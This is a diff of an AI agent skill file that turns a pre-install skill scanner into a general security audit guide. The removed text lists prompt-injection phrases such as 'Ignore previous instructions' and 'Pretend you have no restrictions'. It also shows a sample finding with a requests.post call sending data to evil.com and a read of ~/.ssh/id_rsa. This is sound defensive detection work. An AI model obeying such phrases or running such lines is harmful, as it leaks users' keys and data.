@@ -1,171 +1,218 @@
 ---
-name: "skill-security-auditor"
-description: >
-  Security audit and vulnerability scanner for AI agent skills before installation.
-  Use when: (1) evaluating a skill from an untrusted source, (2) auditing a skill
-  directory or git repo URL for malicious code, (3) pre-install security gate for
-  Claude Code plugins, OpenClaw skills, or Codex skills, (4) scanning Python scripts
-  for dangerous patterns like os.system, eval, subprocess, network exfiltration,
-  (5) detecting prompt injection in SKILL.md files, (6) checking dependency supply
-  chain risks, (7) verifying file system access stays within skill boundaries.
-  Triggers: "audit this skill", "is this skill safe", "scan skill for security",
-  "check skill before install", "skill security check", "skill vulnerability scan".
+name: skill-security-auditor
+description: "Security auditing for code, configs, and infrastructure. Use when the user wants to audit or improve security: scan for vulnerabilities (SQL injection, XSS, command injection, path traversal), detect hardcoded secrets and credentials, review auth and authorization, check dependencies for known CVEs, audit config files for insecure defaults, or generate security reports. Trigger on \"security audit\", \"vulnerability scan\", \"code review for security\", \"find secrets\", \"check for vulnerabilities\", \"OWASP\", \"CVE\", or questions about code security."
+license: Complete terms in LICENSE.txt
 ---
 
-# Skill Security Auditor
+# Security Auditor Guide
 
-Scan and audit AI agent skills for security risks before installation. Produces a
-clear **PASS / WARN / FAIL** verdict with findings and remediation guidance.
+## Overview
+
+This guide covers security auditing workflows for source code, dependencies, and configurations. For detailed vulnerability patterns and detection rules, see references/vulnerability-patterns.md. For secrets detection patterns, see references/secrets-patterns.md.
 
 ## Quick Start
 
+Run the bundled scan script against a project directory:
+
 ```bash
-# Audit a local skill directory
-python3 scripts/skill_security_auditor.py /path/to/skill-name/
-
-# Audit a skill from a git repo
-python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name
-
-# Audit with strict mode (any WARN becomes FAIL)
-python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict
-
-# Output JSON report
-python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json
+python scripts/scan_project.py /path/to/project
 ```
 
-## What Gets Scanned
+This performs a lightweight scan for common issues: hardcoded secrets, dangerous function calls, and insecure patterns. For deeper analysis, follow the workflows below.
 
-### 1. Code Execution Risks (Python/Bash Scripts)
+### Testing the scripts
 
-Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:
-
-| Category | Patterns Detected | Severity |
-|----------|-------------------|----------|
-| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | 🔴 CRITICAL |
-| **Code execution** | `eval()`, `exec()`, `compile()`, `__import__()` | 🔴 CRITICAL |
-| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains | 🔴 CRITICAL |
-| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | 🔴 CRITICAL |
-| **Credential harvesting** | reads from `~/.ssh`, `~/.aws`, `~/.config`, env var extraction patterns | 🔴 CRITICAL |
-| **File system abuse** | writes outside skill dir, `/etc/`, `~/.bashrc`, `~/.profile`, symlink creation | 🟡 HIGH |
-| **Privilege escalation** | `sudo`, `chmod 777`, `setuid`, cron manipulation | 🔴 CRITICAL |
-| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()` | 🟡 HIGH |
-| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | ⚪ INFO |
-
-### 2. Prompt Injection in SKILL.md
-
-Scans SKILL.md and all `.md` reference files for:
-
-| Pattern | Example | Severity |
-|---------|---------|----------|
-| **System prompt override** | "Ignore previous instructions", "You are now..." | 🔴 CRITICAL |
-| **Role hijacking** | "Act as root", "Pretend you have no restrictions" | 🔴 CRITICAL |
-| **Safety bypass** | "Skip safety checks", "Disable content filtering" | 🔴 CRITICAL |
-| **Hidden instructions** | Zero-width characters, HTML comments with directives | 🟡 HIGH |
-| **Excessive permissions** | "Run any command", "Full filesystem access" | 🟡 HIGH |
-| **Data extraction** | "Send contents of", "Upload file to", "POST to" | 🔴 CRITICAL |
-
-### 3. Dependency Supply Chain
-
-For skills with `requirements.txt`, `package.json`, or inline `pip install`:
-
-| Check | What It Does | Severity |
-|-------|-------------|----------|
-| **Known vulnerabilities** | Cross-reference with PyPI/npm advisory databases | 🔴 CRITICAL |
-| **Typosquatting** | Flag packages similar to popular ones (e.g., `reqeusts`) | 🟡 HIGH |
-| **Unpinned versions** | Flag `requests>=2.0` vs `requests==2.31.0` | ⚪ INFO |
-| **Install commands in code** | `pip install` or `npm install` inside scripts | 🟡 HIGH |
-| **Suspicious packages** | Low download count, recent creation, single maintainer | ⚪ INFO |
-
-### 4. File System & Structure
-
-| Check | What It Does | Severity |
-|-------|-------------|----------|
-| **Boundary violation** | Scripts referencing paths outside skill directory | 🟡 HIGH |
-| **Hidden files** | `.env`, dotfiles that shouldn't be in a skill | 🟡 HIGH |
-| **Binary files** | Unexpected executables, `.so`, `.dll`, `.exe` | 🔴 CRITICAL |
-| **Large files** | Files >1MB that could hide payloads | ⚪ INFO |
-| **Symlinks** | Symbolic links pointing outside skill directory | 🔴 CRITICAL |
+```bash
+python scripts/scan_project.py /path/to/some/project --format text
+python scripts/scan_secrets.py /path/to/some/project --format text
+```
 
 ## Audit Workflow
 
-1. **Run the scanner** on the skill directory or repo URL
-2. **Review the report** — findings grouped by severity
-3. **Verdict interpretation:**
-   - **✅ PASS** — No critical or high findings. Safe to install.
-   - **⚠️ WARN** — High/medium findings detected. Review manually before installing.
-   - **❌ FAIL** — Critical findings. Do NOT install without remediation.
-4. **Remediation** — each finding includes specific fix guidance
+### 1. Reconnaissance
 
-## Reading the Report
-
-```
-╔══════════════════════════════════════════════╗
-║  SKILL SECURITY AUDIT REPORT                ║
-║  Skill: example-skill                        ║
-║  Verdict: ❌ FAIL                            ║
-╠══════════════════════════════════════════════╣
-║  🔴 CRITICAL: 2  🟡 HIGH: 1  ⚪ INFO: 3    ║
-╚══════════════════════════════════════════════╝
-
-🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
-   Pattern: eval(user_input)
-   Risk: Arbitrary code execution from untrusted input
-   Fix: Replace eval() with ast.literal_eval() or explicit parsing
-
-🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
-   Pattern: requests.post("https://evil.com/collect", data=results)
-   Risk: Data exfiltration to external server
-   Fix: Remove outbound network calls or verify destination is trusted
-
-🟡 HIGH [FS-BOUNDARY] scripts/scanner.py:15
-   Pattern: open(os.path.expanduser("~/.ssh/id_rsa"))
-   Risk: Reads SSH private key outside skill scope
-   Fix: Remove filesystem access outside skill directory
-
-⚪ INFO [DEPS-UNPIN] requirements.txt:3
-   Pattern: requests>=2.0
-   Risk: Unpinned dependency may introduce vulnerabilities
-   Fix: Pin to specific version: requests==2.31.0
-```
-
-## Advanced Usage
-
-### Audit a Skill from Git Before Cloning
+Before auditing, understand the project:
 
 ```bash
-# Clone to temp dir, audit, then clean up
-python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
+# Identify languages, frameworks, and entry points
+find . -type f -name "*.py" -o -name "*.js" -o -name "*.ts" -o -name "*.go" -o -name "*.java" | head -20
+cat package.json pyproject.toml requirements.txt go.mod pom.xml 2>/dev/null
 ```
 
-### CI/CD Integration
+Key questions:
+- What frameworks are used? (Express, Django, Flask, Spring, etc.)
+- Where are the entry points? (routes, controllers, API handlers)
+- How is authentication handled?
+- What external services are called?
+- Is user input accepted? Where?
+
+### 2. Secrets Detection
+
+Scan for hardcoded credentials, API keys, and tokens. See references/secrets-patterns.md for the full pattern list.
+
+```bash
+python scripts/scan_secrets.py /path/to/project
+```
+
+Common patterns to check:
+- API keys and tokens in source files
+- Database connection strings with embedded passwords
+- Private keys or certificates committed to the repo
+- `.env` files or config files with plaintext secrets
+- Secrets in CI/CD configuration files
+
+### 3. Vulnerability Scanning
+
+#### OWASP Top 10 Checklist
+
+| # | Category | What to Look For |
+|---|----------|-----------------|
+| A01 | Broken Access Control | Missing auth checks, IDOR, privilege escalation |
+| A02 | Cryptographic Failures | Weak algorithms, plaintext storage, missing TLS |
+| A03 | Injection | SQL, NoSQL, OS command, LDAP, XSS |
+| A04 | Insecure Design | Missing rate limits, business logic flaws |
+| A05 | Security Misconfiguration | Debug mode, default credentials, verbose errors |
+| A06 | Vulnerable Components | Outdated dependencies with known CVEs |
+| A07 | Auth Failures | Weak passwords, missing MFA, session issues |
+| A08 | Data Integrity Failures | Insecure deserialization, unsigned updates |
+| A09 | Logging Failures | Missing audit logs, sensitive data in logs |
+| A10 | SSRF | Unvalidated URLs in server-side requests |
+
+#### Language-Specific Checks
+
+**Python**
+```python
+# Dangerous: SQL injection
+cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
+# Safe: Parameterized query
+cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+
+# Dangerous: Command injection
+os.system(f"ping {hostname}")
+# Safe: Use subprocess with list args
+subprocess.run(["ping", hostname], capture_output=True)
+
+# Dangerous: Path traversal
+open(f"/data/{user_input}")
+# Safe: Validate and resolve path
+path = pathlib.Path("/data") / user_input
+path.resolve().relative_to(pathlib.Path("/data").resolve())
+```
+
+**JavaScript/TypeScript**
+```javascript
+// Dangerous: XSS via innerHTML
+element.innerHTML = userInput;
+// Safe: Use textContent or sanitize
+element.textContent = userInput;
+
+// Dangerous: Prototype pollution
+Object.assign(target, JSON.parse(userInput));
+// Safe: Validate input structure
+const parsed = JSON.parse(userInput);
+if (typeof parsed !== 'object' || Array.isArray(parsed)) throw new Error();
+const sanitized = Object.fromEntries(
+  Object.entries(parsed).filter(([k]) => !k.startsWith('__'))
+);
+
+// Dangerous: eval or Function constructor
+eval(userInput);
+// Safe: Never use eval with user input
+```
+
+**Go**
+```go
+// Dangerous: SQL injection
+db.Query("SELECT * FROM users WHERE id = " + id)
+// Safe: Parameterized query
+db.Query("SELECT * FROM users WHERE id = $1", id)
+
+// Dangerous: Path traversal
+http.ServeFile(w, r, filepath.Join(baseDir, r.URL.Path))
+// Safe: Clean and validate path
+cleaned := filepath.Clean(r.URL.Path)
+full := filepath.Join(baseDir, cleaned)
+if !strings.HasPrefix(full, baseDir) { http.Error(...) }
+```
+
+### 4. Dependency Audit
+
+Check for known vulnerabilities in project dependencies:
+
+```bash
+# Python
+pip audit
+safety check -r requirements.txt
+
+# Node.js
+npm audit
+npx auditjs ossi
+
+# Go
+govulncheck ./...
+
+# General (if Trivy is available)
+trivy fs --scanners vuln /path/to/project
+```
+
+Review the output and categorize by severity (critical, high, medium, low). Critical and high severity findings should be addressed before deployment.
+
+### 5. Configuration Review
+
+Check for insecure defaults in configuration files:
 
 ```yaml
-# GitHub Actions step
-- name: "audit-skill-security"
-  run: |
-    python3 skill-security-auditor/scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
-    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
+# Common misconfigurations to flag:
+DEBUG: true                    # Debug mode in production
+ALLOWED_HOSTS: ["*"]          # Unrestricted host access
+CORS_ALLOW_ALL_ORIGINS: true  # Open CORS policy
+SECRET_KEY: "default"         # Default or weak secret key
+SSL_VERIFY: false             # Disabled TLS verification
 ```
 
-### Batch Audit
+Check infrastructure configs:
+- Dockerfiles: Running as root, exposing unnecessary ports
+- CI/CD: Secrets in plaintext, overly permissive permissions
+- Cloud configs: Public S3 buckets, open security groups
 
-```bash
-# Audit all skills in a directory
-for skill in skills/*/; do
-  python3 scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
-done
+### 6. Authentication and Authorization Review
+
+Key areas to verify:
+- Password hashing uses strong algorithms (bcrypt, argon2, scrypt)
+- Sessions have appropriate timeouts and rotation
+- JWT tokens are validated properly (algorithm, expiry, signature)
+- API endpoints enforce authorization checks
+- Role-based access control is consistently applied
+- Rate limiting is in place for login and sensitive endpoints
+
+## Report Format
+
+When generating a security audit report, use this structure:
+
+```markdown
+# Security Audit Report
+
+## Summary
+- **Project**: [name]
+- **Date**: [date]
+- **Scope**: [what was audited]
+- **Risk Level**: [Critical/High/Medium/Low]
+
+## Findings
+
+### [SEVERITY] Finding Title
+- **Category**: [OWASP category]
+- **Location**: [file:line]
+- **Description**: [what the issue is]
+- **Impact**: [what could happen if exploited]
+- **Recommendation**: [how to fix]
+
+## Statistics
+- Total findings: [count]
+- Critical: [count] | High: [count] | Medium: [count] | Low: [count]
 ```
 
-## Threat Model Reference
+## Next Steps
 
-For the complete threat model, detection patterns, and known attack vectors against AI agent skills, see [references/threat-model.md](references/threat-model.md).
-
-## Limitations
-
-- Cannot detect logic bombs or time-delayed payloads with certainty
-- Obfuscation detection is pattern-based — a sufficiently creative attacker may bypass it
-- Network destination reputation checks require internet access
-- Does not execute code — static analysis only (safe but less complete than dynamic analysis)
-- Dependency vulnerability checks use local pattern matching, not live CVE databases
-
-When in doubt after an audit, **don't install**. Ask the skill author for clarification.
+- For detailed vulnerability patterns and code examples, see references/vulnerability-patterns.md
+- For secrets detection regex patterns, see references/secrets-patterns.md
